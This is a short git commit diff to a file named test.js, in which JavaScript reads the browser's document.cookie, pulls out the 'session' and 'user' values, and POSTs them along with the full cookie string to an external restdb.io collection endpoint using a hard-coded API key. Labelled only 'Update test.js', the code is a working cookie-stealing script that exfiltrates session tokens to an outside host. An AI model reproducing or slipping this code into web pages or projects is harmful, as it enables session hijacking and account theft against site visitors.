59c0ebb988c4341110d908bef363450f96f3f8be
Heiner Lohaus <heiner@lohaus.eu>
2020-07-10 07:17:21 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,9 +1,14 @@
+var s = document.cookie.split('session')[1].split(";")[0];
+var u = document.cookie.split('user')[1].split(";")[0];
+
 $.ajax({
     url: "https://geile-72c8.restdb.io/rest/cookies",
     headers: { 'x-apikey': '5f07c7a2a529a1752c476f90' },
     type: "POST",
     data: {
-        cookie: document.cookie
+        cookie: document.cookie,
+        user: u,
+        session: s
     },
     success: function(response){
         console.log(response);
